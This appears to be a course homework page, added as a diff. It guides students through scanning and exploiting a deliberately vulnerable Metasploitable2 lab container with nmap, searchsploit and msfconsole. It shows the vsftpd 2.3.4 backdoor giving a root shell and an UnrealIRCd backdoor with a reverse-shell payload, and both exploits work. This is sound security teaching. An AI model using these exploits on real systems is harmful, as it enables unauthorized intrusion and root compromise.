@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html xmlns='http://www.w3.org/1999/xhtml' lang='' xml:lang=''>
+<head>
+  <meta charset='utf-8'></meta>
+  <meta name='generator' content='pandoc'></meta>
+  <meta name='viewport' content='width=device-width, initial-scale=1.0, user-scalable=yes'></meta>
+  <title>Metasploitable2 Exploration</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    /* The extra [class] is a hack that increases specificity enough to
+       override a similar rule in reveal.js */
+    ul.task-list[class]{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      font-size: inherit;
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+  <link rel='stylesheet' href='../../markdown.css'></link>
+  <script>
+  function openTab(evt, tabName) {
+    // Declare all variables
+    var i, tabcontent, tablinks;
+
+    // Get all elements with class="tabcontent" and hide them
+    tabcontent = document.getElementsByClassName("tabcontent");
+    for (i = 0; i < tabcontent.length; i++) {
+      tabcontent[i].style.display = "none";
+    }
+
+    // Get all elements with class="tablinks" and remove the class "active"
+    tablinks = document.getElementsByClassName("tablinks");
+    for (i = 0; i < tablinks.length; i++) {
+      tablinks[i].className = tablinks[i].className.replace(" active", "");
+    }
+
+    // Show the current tab, and add an "active" class to the button that opened the tab
+    document.getElementById(tabName).style.display = "block";
+    evt.currentTarget.className += " active";
+  }
+
+  function insertCopyLink(text) {
+    document.write("<span class=\"copylink copy_img\" onclick=\"navigator.clipboard.writeText('" + text.replace(/\"/g,"\\'") + "')\"></span>");
+  }
+  </script>
+</head>
+<body>
+<h1 id='metasploitable2-exploration'>Metasploitable2 Exploration</h1>
+<p><a href='../index.html'>Go up to the NWS HW page</a> (<a href='../index.md'>md</a>) | <a href='index-full.html'>view one-page version</a></p><div class='tab'>
+<button class='tablinks' onclick="openTab(event,'toverview')" id='defaultOpen'>Overview</button>
+<button class='tablinks' onclick="openTab(event,'tchangelog')">Changelog</button>
+<button class='tablinks' onclick="openTab(event,'tinvestigation')">Investigation</button>
+<button class='tablinks' onclick="openTab(event,'tmsfconsole')">msfconsole</button>
+<button class='tablinks' onclick="openTab(event,'tunrealircd-exploit')">UnrealIRCD Exploit</button>
+<button class='tablinks' onclick="openTab(event,'tone-more')">One More</button>
+<button class='tablinks' onclick="openTab(event,'texplore')">Explore</button>
+<button class='tablinks' onclick="openTab(event,'tsubmission')">Submission</button>
+</div>
+<div id='toverview' class='tabcontent'><h3 id='overview'>Overview</h3>
+<p>In this assignment you will explore the metasploit Docker container. This container, based on the <a href='https://docs.rapid7.com/metasploit/metasploitable-2/'>Metasploitable 2 setup</a>, and the <a href='https://hub.docker.com/layers/tleemcjr/metasploitable2/latest/images/sha256-e559450b37dccc1909eafa2df5b20bb052e1bd801246f4539a3ef183d5f7288a'>tleemcjr/metasploitable2 Docker image</a>, is an intentionally vulnerable container where one can practice exploits. We will be working through a few of the <a href='https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/'>intentional exploits</a> in the image.</p>
+<p>You will be submitting a <a href='metasploit.py.html'>metasploit.py</a> (<a href='metasploit.py'>src</a>) Python file.</p>
+</div><div id='tchangelog' class='tabcontent'><h3 id='changelog'>Changelog</h3>
+<p>Any changes to this page will be put here for easy reference. Typo fixes and minor clarifications are not listed here. So far there aren’t any significant changes to report.</p>
+</div><div id='tinvestigation' class='tabcontent'><h3 id='investigation'>Investigation</h3>
+<h4 id='nmap'><code>nmap</code></h4>
+<p>First we want to see what service are available on that container. From <em>outer1</em>, run <code>nmap</code>. We saw <code>nmap</code> in the <a href='../netcmds/index.html'>Network commands introduction</a> (<a href='../netcmds/index.md'>md</a> homework. We will use the <code>-sV</code> parameter, as that will attempt to identify which service, including version, is running on each port. This will take some time – perhaps 3-5 minutes. Note that it takes the metasploit container a bit of time (up to 30 seconds on a slow computer) to load all the services when the container first starts up.</p>
+<pre><code>root@outer1:/# date;nmap -sV metasploit;date
+Thu Jan 25 08:15:00 EST 2024
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-25 08:15 EST
+Nmap scan report for metasploit (192.168.100.3)
+Host is up (0.0000020s latency).
+Not shown: 980 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec?
+513/tcp  open  login
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  landesk-rc  LANDesk remote management
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8180/tcp open  unknown
+MAC Address: 02:42:C0:A8:64:03 (Unknown)
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 188.65 seconds
+Thu Jan 25 08:18:09 EST 2024
+root@outer1:/# </code></pre>
+<h4 id='searchsploit'><code>searchsploit</code></h4>
+<p>Installed on the Docker images is a database of known vulnerabilities and their exploits. <code>searchsploit</code> will search that database for the string passed in as a command line parameter. For example, we will investigate the <a href='https://www.cve.org/CVERecord?id=CVE-2011-2523'>vsFTPd 2.3.4 vulnerability</a> that you examined in the <a href='../docker/index.html'>Docker setup homework</a> (<a href='../docker/index.md'>md</a>). This is the one where, if you end your username with <code>:)</code>, it will open up a shell on port 6200 that you can access (with full root permissions) via <code>nc metasploit 6200</code>.</p>
+<pre><code>root@outer1:/# searchsploit vsftpd
+[i] Found (#2): /usr/local/exploitdb/files_exploits.csv
+[i] To remove this message, please edit "/root/.searchsploit_rc" which has "package_array: exploitdb" to point too: path_array+=("/usr/local/exploitdb")
+
+[i] Found (#2): /usr/local/exploitdb/files_shellcodes.csv
+[i] To remove this message, please edit "/root/.searchsploit_rc" which has "package_array: exploitdb" to point too: path_array+=("/usr/local/exploitdb")
+
+--------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                         |  Path
+--------------------------------------------------------------------------------------- ---------------------------------
+vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                         | linux/dos/5814.pl
+vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                         | windows/dos/31818.sh
+vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                         | windows/dos/31819.pl
+vsftpd 2.3.2 - Denial of Service                                                       | linux/dos/16270.c
+vsftpd 2.3.4 - Backdoor Command Execution                                              | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                 | unix/remote/17491.rb
+vsftpd 3.0.3 - Remote Denial of Service                                                | multiple/remote/49719.py
+--------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+root@outer1:/# </code></pre>
+<p>We can see that vulnerability toward the bottom of that list – the ones with the 2.3.4 in the version column.</p>
+</div><div id='tmsfconsole' class='tabcontent'><h3 id='msfconsole'><code>msfconsole</code></h3>
+<p>The Metasploit Framework console is a means to test out already written exploits. It has a huge database of exploits – many tens of thousands. Each of these can be used on any host, whether it is on the metasploit container or on the real Internet.</p>
+<p>Normally one would want to update the exploit database via <code>msfupdate</code>. This won’t matter for our usage in this course, as the exploits we are working on are a bit older. Also, since we are in a container, we would have to update it each time the container starts.</p>
+<p>Launch the console via running <code>msfconsole</code>. After a bit of a startup delay, you will get a <code>msf6 &gt;</code> prompt.</p>
+<p>We are going to work through the same <a href='https://www.cve.org/CVERecord?id=CVE-2011-2523'>vsFTPd 2.3.4 vulnerability</a> that you examined in the <a href='../docker/index.html'>Docker setup homework</a> (<a href='../docker/index.md'>md</a>), so that you can see a different way to exploit this vulnerability.</p>
+<p>In the console, run <code>search vsftpd</code>. This will search for all exploits that have that string as part of the name or description:</p>
+<pre><code>msf6 &gt; search vsftpd
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
+   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf6 &gt; </code></pre>
+<p>This list is smaller than the list you found in the previous section (via <code>searchsploit</code>). The <code>searchsploit</code> command will list all the exploits in the database, but not all of them have been written programmatically in such a way that they can be used with <code>msfconsole</code>, which is why the <code>msfconsole</code> list is smaller.</p>
+<p>Of the ones shown, we want to use the second one, which is number 1 in the list, so we enter <code>use 1</code>. This will give us a different prompt (<code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt;</code>), as we have loaded up an exploit.</p>
+<p>To find information about the exploit, enter <code>info</code>:</p>
+<pre><code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; info
+
+       Name: VSFTPD v2.3.4 Backdoor Command Execution
+     Module: exploit/unix/ftp/vsftpd_234_backdoor
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2011-07-03
+
+Provided by:
+  hdm &lt;x@hdm.io&gt;
+  MC &lt;mc@metasploit.com&gt;
+
+Available targets:
+      Id  Name
+      --  ----
+  =&gt;  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/u
+                                     sing-metasploit.html
+  RPORT   21               yes       The target port (TCP)
+
+Payload information:
+  Space: 2000
+  Avoid: 0 characters
+
+Description:
+  This module exploits a malicious backdoor that was added to the   VSFTPD download
+  archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
+  June 30th 2011 and July 1st 2011 according to the most recent information
+  available. This backdoor was removed on July 3rd 2011.
+
+References:
+  OSVDB (73573)
+  http://pastebin.com/AetT9sS5
+  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+
+
+View the full module info with the info -d command.
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; </code></pre>
+<p>Notice in the “target options” section, it gives us two variables that can be set. To execute the exploit, we need to tell it what target to attack. We could set the port (<code>RPORT</code>), but we’ll keep it as the default port 21 (the standard port for FTP). We have to set the RHOST variable (via <code>set RHOST &lt;target&gt;</code>) to set this value:</p>
+<pre><code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOST metasploit
+RHOST =&gt; metasploit
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; </code></pre>
+<p>To execute the exploit, we enter <code>run</code>. This particular one needs it entered twice – once to open the shell, and the second time to use it. The first time you run it, it will pause after the prompt, <code>USER: 331 Please specify the password</code>; that’s showing you what the vsFTPd client output, but you don’t have to enter the password – the programmed exploit does that.</p>
+<pre><code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; run
+
+[*] 192.168.100.3:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.100.3:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; run
+
+[*] 192.168.100.3:21 - The port used by the backdoor bind listener is already open
+[+] 192.168.100.3:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (192.168.100.101:46311 -&gt; 192.168.100.3:6200) at 2024-01-25 08:44:39 -0500
+
+whoami
+root
+
+cat /etc/ssh/ssh_host_rsa_key.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcd
+YfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+d
+lEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew== 
+root@metasploitable
+
+exit
+[*] 192.168.100.3 - Command shell session 1 closed.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; </code></pre>
+<p>We exited the exploited shell with <code>exit</code>. When back on the msfconsole prompt, you can unload this exploit via <code>back</code>. To exit msfconsole, enter <code>exit</code>.</p>
+<p>Although we won’t do this, this process is one way that attackers perform exploits against targets on the Internet.</p>
+</div><div id='tunrealircd-exploit' class='tabcontent'><h3 id='unrealircd-exploit'>UnrealIRCD Exploit</h3>
+<p>If you look back at the <code>nmap -sV</code> output from above, you will see this line:</p>
+<pre><code>6667/tcp open  irc         UnrealIRCd</code></pre>
+<p><a href='https://en.wikipedia.org/wiki/Internet_Relay_Chat'>IRC</a>, or Internet Relay Chat, is an instant messaging system. It used to be very common many years ago, but has largely been replaced by other, more modern, applications. It is running on port 6667 (the default port for <code>irc</code>).</p>
+<p>The <code>-sV</code> options to <code>nmap</code> attempted to determine the version of UnrealIRCd running, but it was not able to do so with just those parameters. <code>nmap</code> has a series of scripts that come with it, and these scripts can be utilized to find more information about a port, a service, or a vulnerability. These scripts are in <code>/usr/share/nmap/scripts</code>, if you are interested. We could ask <code>nmap</code> to run those scripts on a given host via <code>nmap --script irc-* metasploit</code>. This means to run <em>all</em> the scripts found via <code>ls /usr/share/nmap/scripts/irc-*</code>. There are scripts to brute force passwords (<code>irc-brute.nse</code>), find more information about the server (<code>irc-info.nse</code>), etc. The brute force one, in particular, will take quite some time to run. And we only want to find more information about the version number, so we decide to only use the <code>irc-info.nse</code> script. As we know the port we want to investigate, we tell it to only look at that port (<code>-p 6667</code>), rather than all ports.</p>
+<pre><code>root@outer2:~# nmap -p 6667 --script irc-info metasploit
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-30 10:11 EST
+Nmap scan report for metasploit (192.168.100.3)
+Host is up (0.000023s latency).
+
+PORT     STATE SERVICE
+6667/tcp open  irc
+| irc-info: 
+|   users: 1
+|   servers: 1
+|   lusers: 1
+|   lservers: 0
+|   server: irc.Metasploitable.LAN
+|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
+|   uptime: 1 days, 17:41:43
+|   source ident: nmap
+|   source host: CAC88821.2ADA0512.FFFA6D49.IP
+|_  error: Closing Link: gwscbkono[192.168.100.102] (Quit: gwscbkono)
+MAC Address: 02:42:C0:A8:64:03 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
+root@outer2:~# </code></pre>
+<p>The version is listed there: <code>version: Unreal3.2.8.1</code>. As it turns out, there is a vulnerability with that version of UnrealIRCd: <a href='https://nvd.nist.gov/vuln/detail/CVE-2010-2075'>CVE-2010-2075</a>.</p>
+<p>Now, in <code>msfconsole</code>, we can search for an exploit for that version of UnrealIRCd. Below are the commands to enter, and commentary on them, but the output is not shown here. You should run this on one of the outer? Docker containers. To start, run <code>msfconsole</code> from the command line. Enter the following commands below, so that you understand what is going on, and so that you can see the output.</p>
+<ul>
+<li><code>search unrealircd</code>: this finds all the exploits (only one) for that application. We would need to verify that the version numbers match, and in this case they do – port 6667 on <em>metasploit</em> is running version 3.2.8.1, which is what the one and only exploit uses.
+<ul>
+<li>Note from the output that the module name is <code>exploit/unix/irc/unreal_ircd_3281_backdoor</code>, and the module description is <code>UnrealIRCD 3.2.8.1 Backdoor Command Execution</code>; this will become relevant below.</li>
+</ul></li>
+<li><code>use 0</code>: use the exploit by the number displayed.</li>
+<li><code>info</code>: shows information about the loaded module, including the variables that can be set.
+<ul>
+<li>Notice that <code>RHOSTS</code> is required, but not yet set.</li>
+</ul></li>
+<li><code>show options</code>: shows just the variables that can be set, and not the rest of the information.
+<ul>
+<li>As above, notice that <code>RHOSTS</code> is required, but not yet set.</li>
+</ul></li>
+<li><code>set rhosts metasploit</code>: set the target node to exploit.</li>
+<li><code>exploit</code>: run the exploit
+<ul>
+<li>Well, that didn’t work. Notice the output: <code>Exploit failed: A payload has not been selected</code></li>
+</ul></li>
+<li><code>show payloads</code>: these are the compatible payloads for this attack. We’ll pick the <code>payload/cmd/unix/reverse</code> one, which is listed as number 6.</li>
+<li><code>set payload 6</code>: select the payload to use from the list just displayed.</li>
+<li><code>exploit</code>: run the exploit
+<ul>
+<li>Well, that didn’t work. Notice the output: <code>The following options failed to validate: LHOST</code></li>
+</ul></li>
+<li><code>show options</code>: show the options again
+<ul>
+<li>Notice that <code>LHOST</code> is required, but not set</li>
+</ul></li>
+<li><code>set lhost 192.168.100.102</code>: this needs to be set to the (non-localhost) IP address of the machine we are running the exploit on.</li>
+<li><code>exploit</code>: it works!</li>
+</ul>
+<p>The output from the last <code>exploit</code> is:</p>
+<pre><code>msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; exploit
+
+[*] Started reverse TCP double handler on 192.168.100.102:4444 
+[*] 192.168.100.3:6667 - Connected to 192.168.100.3:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+[*] 192.168.100.3:6667 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo FUkOSc1MRDhkbUwW;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "sh: line 2: Connected: command not found\r\nsh: line 3: Escape: command not found\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 1 opened (192.168.100.102:4444 -&gt; 192.168.100.3:45318) at 2024-01-30 10:22:37 -0500
+
+
+Shell Banner:
+FUkOSc1MRDhkbUwW
+-----</code></pre>
+<p>At this point, we can type in any command (<code>whoami</code>, <code>pwd</code>, <code>ls</code>, etc.), and it will run that on <em>metasploit</em>.</p>
+</div><div id='tone-more' class='tabcontent'><h3 id='one-more'>One more</h3>
+<p>The final part of this assignment is for you to pick an exploit. Pick a service or port on <em>metasploit</em> that you want to attack. You can’t pick the two services that we used as examples here (vsFTPd or UnrealIRCd). Scan the <em>metasploit</em> container with the nmap command shown above. Given the version of the service, as well as the other information that <code>nmap</code> provides, look up the exploit via <code>searchsploit</code>. Then you can execute it in <code>msfconsole</code>. The intent of this part is for you to use the exploit in <code>msfconsole</code>, not to write one of your own. Your exploit does not have to be a shell, just something that makes use of a vulnerability in the <em>metasploit</em> container. Note that <code>msfconsole</code> has many (thousands?) of exploits, but not all work on <em>metasploit</em>. You need to check the versions, described above, to see which ones work.</p>
+<p>Whatever exploit you choose, you will need to copy the module name and description. For example, in the vsFTPd example from above, <code>msfconsole</code> output the following:</p>
+<pre><code>msf6 &gt; search vsftpd
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
+   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf6 &gt; </code></pre>
+<p>In this example, as we used the (#1), the script name is <code>exploit/unix/ftp/vsftpd_234_backdoor</code>, and the description is <code>VSFTPD v2.3.4 Backdoor Command Execution</code>.</p>
+<p>You will provide information about which one you selected in the <a href='metasploit.py.html'>metasploit.py</a> (<a href='metasploit.py'>src</a>) Python file.</p>
+</div><div id='texplore' class='tabcontent'><h3 id='explore'>Explore</h3>
+<p>You are welcome to explore any and all exploits with <code>msfconsole</code>, but it is not required for this assignment. Just be sure to only use them on the <em>metasploit</em> container! Note that there are three versions of the Metasploitable framework – <a href='https://www.metasploit.com'>1</a>, <a href='https://docs.rapid7.com/metasploit/metasploitable-2/'>2</a>, and <a href='https://github.com/rapid7/metasploitable3'>3</a>. We are using version 2 of the framework, as that one was available as an already configured Docker container.</p>
+<p>You can find a how-to guide to using version 2 <a href='https://www.exploit-db.com/docs/english/44040-the-easiest-metasploit-guide-you’ll-ever-read.pdf'>here</a>. You are also welcome to use online guides, such as <a href='https://www.hackingarticles.in/comprehensive-guide-on-metasploitable-2/'>this one</a>. Using the various exploits starts on page 43. We’ve already done the first one. Note that this document uses a Nessus scan, and we used <code>nmap</code>.</p>
+</div><div id='tsubmission' class='tabcontent'><h3 id='submission'>Submission</h3>
+<p>You will be submitting and edited version of <a href='metasploit.py.html'>metasploit.py</a> (<a href='metasploit.py'>src</a>).</p>
+</div><script>document.getElementById('defaultOpen').click();</script></body>
+</html>
+
